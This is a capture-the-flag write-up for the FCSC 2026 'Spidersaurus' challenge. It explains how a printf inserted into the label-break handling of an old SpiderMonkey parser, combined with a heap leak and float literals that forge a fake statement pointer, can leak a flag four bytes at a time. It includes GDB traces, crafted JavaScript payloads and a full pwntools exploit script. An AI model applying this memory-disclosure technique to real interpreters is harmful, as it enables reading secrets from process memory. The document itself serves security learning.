## Spidersaurus

```
Suite à quelques déboires avec le langage FORTH, ainsi que le langage BASIC, notre développeur a décidé d'un retour aux origines de l'Internet Multimédia à l'aide de la version 1.3 de l'interpréteur JavaScript SpiderMonkey.

Il nous assure qu'aucune faille de sécurité n'est exploitable, grâce aux paramètres de compilation ; de plus, il nous garantit que le code est certifié pour le passage à l'an 2000.

Cependant, un hacker anonyme nous a transmis un mystérieux fichier test.js qui semble déclencher une lecture de mémoire non initialisée. Pouvez-vous prouver que notre développeur a tort en lisant le contenu de la variable flag ?

Note : Le programme est compilé par clang-17 (sous Debian 13 i386), mais s'exécute sous Debian 13 amd64 (avec libc6:i386 installé).
```

Difficulty: ⭐⭐

Solve: 9

## TL;DR

* get flag address via heap leak
* find correct amount of nested block to control stmt->down
* use float to craft flag adress at the correct offset
* leak flag 

### Challenge discovery

This challenge is a browser exploitation challenge on JSRef (old name for SpiderMonkey the JS engine of Firefox) on version 1.7 from 1998. The challenge patch is small it only adds a flag read from a file and stored on the heap and a printf printing an error.

It was my first time working on SpiderMonkey, and it was a really fun challenge because it made me learn how JS code parsing works and how a simple printf could end up with arbitrary leaks.


### Challenge patch

```c
diff -Nur ../JSRef/jsparse.c ./jsparse.c
--- ../JSRef/jsparse.c	1998-06-03 16:48:56.000000000 +0000
+++ ./jsparse.c	2026-03-16 17:25:42.382106104 +0000
@@ -1226,6 +1226,8 @@
 		}
 		if (stmt->type == STMT_LABEL && stmt->label == label)
 		    break;
+		if (stmt->type > STMT_WHILE_LOOP)
+		    printf("invalid stmt->type %d\n", stmt->type);
 	    }
 	} else {
 	    for (; ; stmt = stmt->down) {
diff -Nur ../JSRef/jsscan.c ./jsscan.c
```

The challenge patch is part of the label handling
```c
        break;
#endif /* JS_HAS_EXCEPTIONS */

      case TOK_BREAK: // + If the token encounter is "break"
	pn = NewParseNode(cx, &ts->token, PN_NULLARY);
	if (!pn)
	    return NULL;
	if (!MatchLabel(cx, ts, pn))
	    return NULL;
	stmt = tc->topStmt;
	label = pn->pn_atom;
	if (label) {
	    for (; ; stmt = stmt->down) {
		if (!stmt) {
		    js_ReportCompileError(cx, ts, "label not found");
		    return NULL;
		}
		if (stmt->type == STMT_LABEL && stmt->label == label)
		    break;
	    }
      <---- PATCH HERE ---->
      else {
	    for (; ; stmt = stmt->down) {
		if (!stmt) {
		    js_ReportCompileError(cx, ts, "invalid break");
		    return NULL;
		}
		if (STMT_IS_LOOP(stmt) || stmt->type == STMT_SWITCH)
		    break;
	    }
	}
	}
```
Whenever a label is found, it will try to find the corresponding label code block, but if it is not found, an error is shown:
```
		if (!stmt) {
		    js_ReportCompileError(cx, ts, "label not found");
		    return NULL;
		}
```

However, during the stack traversal, if a `JSStmtInfo` is found and has an unknown type `stmt->type > STMT_WHILE_LOOP` which shouldn't happen, it parses `JSStmtInfo` and prints the type:
```c
+		if (stmt->type > STMT_WHILE_LOOP)
+		    printf("invalid stmt->type %d\n", stmt->type);
 	    }
```

This is a vulnerability because it prints something that might not be a `JSStmtInfo` and doesn't pop it from the stack or return an error, but only prints.

#### Statement function

This is part of the jsparse.c file in the huge function `static JSParseNode *Statement(JSContext *cx, JSTokenStream *ts, JSTreeContext *tc)` which is used to parse nested code from the JS code by using a stack, all token types are defined in the jsemit.h file:
```c
typedef enum JSStmtType {
    STMT_BLOCK        = 0,      /* compound statement: { s1[;... sN] } */
    STMT_LABEL        = 1,      /* labeled statement:  l: s */
    STMT_IF           = 2,      /* if (then) statement */
    STMT_ELSE         = 3,      /* else statement */
    STMT_SWITCH       = 4,      /* switch statement */
    STMT_WITH         = 5,      /* with statement */
    STMT_TRY	      = 6,	/* try statement */
    STMT_CATCH	      = 7,	/* catch block */
    STMT_FINALLY      = 8,	/* finally statement */
    STMT_DO_LOOP      = 9,      /* do/while loop statement */
    STMT_FOR_LOOP     = 10,     /* for loop statement */
    STMT_FOR_IN_LOOP  = 11,     /* for/in loop statement */
    STMT_WHILE_LOOP   = 12      /* while loop statement */
} JSStmtType;
```

for exemple a code like
```c
for (3;2;1)
{
	while (0)
	{
		if (0)
		{
			break FCSC_2026
		}
	}
}
```

It first encounter the `for (3;2;1)` so it push the `STMT_FOR_LOOP` :
```
      case TOK_FOR:
	/* A FOR node is binary, left is loop control and right is the body. */
	pn = NewParseNode(cx, &ts->token, PN_BINARY);
	if (!pn)
	    return NULL;
	js_PushStatement(tc, &stmtInfo, STMT_FOR_LOOP, -1);
```

The current stack is:
```
STMT_FOR_LOOP 
```

Then it parse the `{}` then the `while (0)` so it push `STMT_BLOCK` + `STMT_WHILE_LOOP` , so the current stack is :
```
STMT_WHILE_LOOP -> STMT_BLOCK -> STMT_FOR_LOOP
```
Then the `if (0)` , which make the stack look like that:
```
STMT_IF -> STMT_BLOCK -> STMT_WHILE_LOOP -> STMT_BLOCK ->  STMT_FOR_LOOP
```

Each nested part is defined by a JSStmtInfo struct:
```c
struct JSStmtInfo {
    JSStmtType      type;           /* statement type */
    ptrdiff_t       top;            /* offset of loop top from cg base */
    ptrdiff_t       update;         /* loop update offset (top if none) */
    ptrdiff_t       breaks;         /* offset of last break in loop */
    ptrdiff_t       continues;      /* offset of last continue in loop */
    JSAtom          *label;         /* label name if type is STMT_LABEL */
    JSStmtInfo      *down;          /* info for enclosing statement */
};
```
The most important field for our chall is `down` which point to the previous part, if we take back our example:
```
STMT_IF -> STMT_BLOCK -> STMT_WHILE_LOOP -> STMT_BLOCK ->  STMT_FOR_LOOP
```

```
STMT_IF  ----.down--> STMT_BLOCK ----.down-->  STMT_WHILE_LOOP  ----.down--> STMT_BLOCK ----.down--> STMT_FOR_LOOP
```

The top of the stack is pointed by `tc->topStmt`

### Example from the patch

The challenge patch give us a test.js file that is related to the vulnerability we need to exploit: 
```js
diff -Nur ../JSRef/test.js ./test.js
--- ../JSRef/test.js	1970-01-01 00:00:00.000000000 +0000
+++ ./test.js	2026-03-16 17:25:42.386106104 +0000
@@ -0,0 +1,12 @@
+print("_bonjour_")
+var x = �;
+for (3;2;1)
+{
+	while (0)
+	{
+		if �(0)
+		{
+			break FCSC_2026
+		}
+	}
+}
```

### Where is the flag 

The flag is read from flag.txt and stored on the heap: 
```c
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    flag_txt = fopen("flag.txt", "r");
+    buf = malloc(1024); flag = buf + 98;
+    if (flag_txt == NULL) {
+        fprintf(stderr, "failed to open flag.txt\n");
+        return 1;
+    }
+    if (buf == NULL || (unsigned int)(flag) & 0xFF != 0x42) {
+	fprintf(stderr, "failed to position flag\n", flag);
+	return 1;
+    }
+    fread(flag, 26, 1, flag_txt);
+    //printf("%08x\n", flag);
+
     version = JSVERSION_DEFAULT;
 #ifdef XP_UNIX
     while ((c = getopt(argc, argv, "v:")) != -1) {
@@ -1210,6 +1226,8 @@
     if (!JS_DefineProperties(cx, it, its_props))
 	return 1;
 
+    GC(cx, NULL, 0, NULL, NULL);
+
```

We can get the flag address with the heap leak from GC output:
```c
    printf("before %lu, after %lu, break %08lx\n",
	   (unsigned long)preBytes, (unsigned long)rt->gcBytes,
#ifdef XP_UNIX
	   (unsigned long)sbrk(0) //sbrk(0) give the address of the top of the heap
```

Usign GDB we can figure out that the flag at heap base+0x342, but most usefull in our case heap_top - 0x21cbe : 
```
gef> search-pattern "FCSC"
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[+] Searching for 'FCSC' in whole memory
[+] In '[heap]' 0x65257000-0x65279000 [rw-] (0x22000 bytes)
  0x65257342:    46 43 53 43 7b 65 78 61  6d 70 6c 65 7d 0a 00 00    |  FCSC{example}...  |
  0x652576f0:    46 43 53 43 7b 65 78 61  6d 70 6c 65 7d 0a 00 00    |  FCSC{example}...  |
[+] In '[stack]' 0xffd67000-0xffd88000 [rw-] (0x21000 bytes)
  0xffd87494:    46 43 53 43 2d 32 30 32  36 2f 70 77 6e 2f 53 70    |  FCSC-2026/pwn/Sp  |
  0xffd87c74:    46 43 53 43 2d 32 30 32  36 2f 70 77 6e 2f 53 70    |  FCSC-2026/pwn/Sp  |
  0xffd87d3c:    46 43 53 43 2d 32 30 32  36 2f 70 77 6e 2f 53 70    |  FCSC-2026/pwn/Sp  |
  0xffd87f62:    46 43 53 43 2d 32 30 32  36 2f 70 77 6e 2f 53 70    |  FCSC-2026/pwn/Sp  |
  0xffd87fd0:    46 43 53 43 2d 32 30 32  36 2f 70 77 6e 2f 53 70    |  FCSC-2026/pwn/Sp  |
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[+] Searching for 'F\x00C\x00S\x00C\x00' in whole memory
gef> xinfo 0x652576f0
---------------------------------------------------------------------------------------------------------------------------------- xinfo: 0x65257342 ----------------------------------------------------------------------------------------------------------------------------------
[ Legend: Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start      End        Size       Offset     Perm Path
0x65257000 0x65279000 0x00022000 0x00000000 rw- [heap] +0x6f0  <-  $edx, $ebp, $esi
Offset (from mapped):  0x65257000 + 0x6f0
```

### Forging arbitrary read

To summarize, we have:
* a path to print data from an address from the stack
* the flag stored on the heap 
* heap leak, so the flag address on the heap

So we "just" need to find a way to control the address on the stack when the printf is triggered to leak the flag in parts of 4 bytes.

First, let's see in GDB how the stack traversal of `JSStmtInfo` works to be sure we fully understand what's happening. To do so, we can set a breakpoint at `*Statement+0xdbc` and the current element will be in EDI and the next one at EDI +0x18, etc.

```
 -> 0x5a458edc 8b7f18                <Statement+0xdbc>   mov    edi, DWORD PTR [edi + 0x18]  <---- get stmt->down
    0x5a458edf 85ff                  <Statement+0xdbf>   test   edi, edi 					 <---- if (!stmt)
    0x5a458ee1 74e2                  <Statement+0xdc1>   je     0x5a458ec5 <Statement+0xda5> 
    0x5a458ee3 8b07                  <Statement+0xdc3>   mov    eax, DWORD PTR [edi]		 <---- store stmt->down->type into EAX
    0x5a458ee5 83f801                <Statement+0xdc5>   cmp    eax, 0x1					 <---- test if stmt->down->type == STMT_LABEL(1)
    0x5a458ee8 74e9                  <Statement+0xdc8>   je     0x5a458ed3 <Statement+0xdb3>
	0x5a458eea 83f80d                <Statement+0xdca>   cmp    eax, 0xd					 <---- stmt->down->type > STMT_WHILE_LOOP (0xd)
    0x5a458eed 72ed                  <Statement+0xdcd>   jb     0x5a458edc <Statement+0xdbc>
    0x5a458eef 83ec10                <Statement+0xdcf>   sub    esp, 0x10
    0x5a458ef2 89442408              <Statement+0xdd2>   mov    DWORD PTR [esp + 0x8], eax   
    0x5a458ef6 e865200000            <Statement+0xdd6>   call   0x5a45af60 <_ZL6printfPKcU25pass_dynamic_object_size1z>  <---- print whatever is in EAX as a int
```

We got for each iteration:
1 - $eax: 0x5a432417 <js_AtomizeString+0x47>  ->  0x8910c483 (that's strange this should not be here)
2 - $eax: 0x5aa0cea0 <heap value>  ->  0x0002003e (that's strange this should not be here)
3 - $edi: 0x00000000 -> go out of the loop

if we remove the non ascii char from the test case we got:
1 - $eax: 0x00000002 (STMT_IF)
2 - $eax: 0x00000000 (STMT_BLOCK)
3 - $eax: 0x0000000c (STMT_WHILE_LOOP)
4 - $eax: 0x00000000 (STMT_BLOCK)
5 - $eax: 0x0000000a (STMT_FOR_LOOP)

which match perfectly our test case: 
```
for (3;2;1)
{
    while (0)
    {
        if (0)
        {
            break FCSC_2026
        }
    }
}
``` 

When the `break FCSC_2026` is parsed, before it was an `if (0)` that was in a block `{}` that was in a `while (0)` that was in a block `{}` that was in a `for (3;2;1)`

Another issue in the code that we haven't talked about yet is what happens if the parser gets an invalid token, it just returns NULL: 
```
case TOK_ERROR:
return NULL;
```
The issue here is that the token is not popped from the stack because of the return NULL without calling `js_PopStatement(tc);`

We need to find a token type that allows us, with the right stack management, to get the flag address at 0x18 after the token, the token type list can be found in jsscan.h as the `JSTokenType` enum.

By looking in GDB with the test case causing a crash and dumping the current `stmt` as `JSStmtInfo` we can see how it works during the stack traversal after it encounters the `break FCSC_2026`:

```
gef> p *(JSStmtInfo *) stmt
$4 = {
  type = STMT_BLOCK,
  top = 0xffffffff,
  update = 0xffffffff,
  breaks = 0xffffffff,
  continues = 0xffffffff,
  label = 0x0,
  down = 0xffb96f9c
}

gef> x/20x 0xffb96f9c
0xffb96f9c: 0x568d4417  0x5691a874  0x0065437b  0x5691ac74
0xffb96fac: 0x5690736c  0x56a69cb0  0xffb971ec  0x00000000
0xffb96fbc: 0x568def7f  0xcc611300  0x56a7e8e0  0xcc611300
0xffb96fcc: 0x56a7a970  0x56a7a988  0x56936ec4  0x00000001
0xffb96fdc: 0xcc611300  0x56a69cb0  0x56a7a970  0x00000002
```


```
p *(JSStmtInfo *) stmt->down
$6 = {
  type = 1452098583,
  top = 0x5691a874,
  update = 0x65437b,
  breaks = 0x5691ac74,
  continues = 0x5690736c,
  label = 0x56a69cb0,
  down = 0xffb971ec (0xffb96f9c + 0x18 => 0xffb971ec)
}

gef> x/20x 0xffb971ec
0xffb971ec: 0x56a7bea0  0x56a7abf0  0x56a7bea0  0x56a7bfa0
0xffb971fc: 0x56a7bea3  0x00000000  0x00000000  0x00000002
0xffb9720c: 0x00000000  0x00000001  0x56a7e980  0x00000003
0xffb9721c: 0x00000001  0x00000000  0x00000003  0x0000000d
0xffb9722c: 0x00000000  0x00000000  0x00000000  0xffb9711c
```

```
gef> p *(JSStmtInfo *) stmt
$10 = {
  type = 1453833888,
  top = 0x56a7abf0,
  update = 0x56a7bea0,
  breaks = 0x56a7bfa0,
  continues = 0x56a7bea3,
  label = 0x0,
  down = 0x0 (0xffb971ec + 0x18 => 0x00000000)
}
```

And now it crashes because stmt = 0x000000 and can't access a non-mapped address.

Our objective is to find a way to place the flag address instead of the last down so it will print the first 4 bytes of the flag as the stmt->down->type and so we can run the exploit len(flag)/4 times to retrieve the whole flag.

First, I tried to get a better understanding of how the node parsing is working and how I can make the stack shift to put controlled values in order to fake them as stmt->down, but I only understood that using more nested code (by adding useless `{}`) shifts the stack. So I turned myself into a human fuzzer and tried multiple patterns; some of them make different crashes and leaks.

The 2nd issue is to put controlled values somewhere in order to put the leaked flag address on the stack. To do that, I've tried multiple things using strings and labels, but it's using float with a sign (parsed as `UnaryExpr`) that I could cause crashes with a controlled address.

![meme](./img/meme.jpg)

Using this template: 
```js
{{var x = �;}}

for (3;2;1)
{
    while (0)
    {
        if (0){{{{
            if (0){{{{

                if �(+X) // with the '+' so it get parsed as UnaryExpr and value push on the stack
                {{
                    break FCSC_2026

                }}
            }}}}
        }}}}
    }
}
```

For this value of X I got as value of the last stmt->down before crash:
```
+7777.999990000000002 -> 0x6bf101c8 |  0x6bf101c8 / 7777.999990000000002 = 232830.64365239217
+7776.999990000000002 -> 0x6bed7449 |  0x6bed7449 / 7776.999990000000002 = 232830.64360657148
+6917.550000000000002 -> 0x60001313 |  0x60001313 / 6917.550000000000002 = 232830.6436527383
```

Based on that, I calculated that for an address N I need to use N / 232830.6436527383 (let's call this K), and the number should have 15 digits after the comma and end with "002" (to be honest, at this point I stopped asking myself why, just by trial and error, I found this and it works, so it was late and that's enough for me). With that, I can craft a 4 byte leak at a controlled address and thus leak the flag.

In GDB:
Parse the last block before `�`
```
p *(JSStmtInfo *) stmt
$4 = {
  type = STMT_BLOCK,
  top = 0x63000c30,
  update = 0x62a98ec4,
  breaks = 0x0,
  continues = 0x63000be0,
  label = 0x0,
  down = 0x62ffe670
}

# Here is the fake JSStmtInfo that is used as stmt->down
x/10wx 0x62ffe670
0x62ffe670: 0x63000c00  0x00000002  0x00000004  0x00000000
0x62ffe680: 0x00000002  0x0210e112  0x62fe86f0  0x00000000
0x62ffe690: 0x00000000  0x00000000
```

Then use the fake JSStmtInfo:
```
p *(JSStmtInfo *) stmt
$5 = {
  type = 1660947456,  <---- not a valid type so will be printed
  top = 0x2,
  update = 0x4,
  breaks = 0x0,
  continues = 0x2,
  label = 0x210e112,
  down = 0x62fe86f0   <----- point to the flag address
}
x/s 0x62fe86f0
0x62fe86f0: "FCSC{", 'A' <repeats 64 times>, "}"
```
And print: `invalid stmt->type 1660947456`

```
p *(JSStmtInfo *) stmt
$6 = {
  type = 1129530182, <--- not a valid type so will be printed : "FCSC"
  top = 0x4141417b,
  update = 0x41414141,
  breaks = 0x41414141,
  continues = 0x41414141,
  label = 0x41414141,
  down = 0x41414141
}
```
And print: `invalid stmt->type 1129530182 (FCSC)`

### Final script 

```py
#!/bin/python3
from pwn import *
import struct

context.log_level = 'error'

BIN_NAME = "spidersaurus"
HOST_NAME= "challenges.fcsc.fr"
PORT = 2203

context.terminal = ['gnome-terminal', '--', 'bash', '-c']

elf = context.binary = ELF(BIN_NAME)

gs = '''
#b *Statement+0xdb3 # EDI =  get stmt->down

#b *Statement+0xdbc
#b *Statement+3437
#b *Statement+59
#b *Statement+0xcd8

#case TOK_ERROR:
#b jsparse.c:1380

#  ->1217       if (!MatchLabel(cx, ts, pn))
#b jsparse.c:1213

#b NewParseNode

continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST_NAME,PORT)
    else:
        return process(elf.path)

# =-=-=-= EXPLOIT =-=-=-=

def make_payload(val):

    js= """
    {{var x = �;}}

    for (3;2;1)
    {

        while (0)
        {
            if (0){{{{
                if (0){{{{
    """
    js += f"if �(+{val})"
    js += """
                {{
                break FCSC_2026

            }}
                }}}}
        }}}}
    }
}
    """
    return js.encode()
i = 0
flag_all = b""
while i < 19: # I assumed the flag was FCSC{sha256} but wasn't the case
    io = None
    try:
        io = start()
        sleep(0.5)

        line = io.recvline()
        leak = int(b"0x" + line.split(b'break ')[-1].replace(b'\n', b''), 16)

        flag = leak - 0x21910 + (i * 4)

        K = 232830.6436527383
        target = flag / K
        target_str = str(target) + "002"

        payload = make_payload(target_str)
        io.sendline(payload)

        io.recvuntil(b"->type ")
        io.recvline()
        leak_flag = int(io.recvline().split(b" ")[2])

        chunk = leak_flag.to_bytes(4, "little")
        flag_all += chunk

        print(flag_all)

        i += 1

        if i >= 18:
            break

    except:
        pass

    finally:
        if io is not None:
            try:
                io.close()
            except:
                pass
# =-=-=-=-=-=-=-=-=-=-=-=
```
